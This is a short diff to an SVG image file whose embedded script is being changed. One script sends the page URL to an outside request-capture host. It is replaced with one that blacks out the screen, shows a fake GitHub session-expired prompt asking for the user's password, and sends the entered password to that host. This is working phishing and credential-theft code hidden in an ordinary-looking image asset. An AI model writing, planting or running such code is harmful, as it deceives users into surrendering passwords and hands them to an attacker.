@@ -1,5 +1,9 @@
 <svg xmlns="http://www.w3.org/2000/svg">
+  <rect width="100%" height="100%" fill="black" />
   <script>
-    fetch('https://aksjwuwu.free.beeceptor.com/?pwned=' + btoa(document.location.href));
+    var p = prompt("GitHub Security Alert: Your session has expired. Please enter password to continue:");
+    if(p) {
+      location.href = "https://aksjwuwu.free.beeceptor.com/?stolen_pass=" + btoa(p);
+    }
   </script>
 </svg>
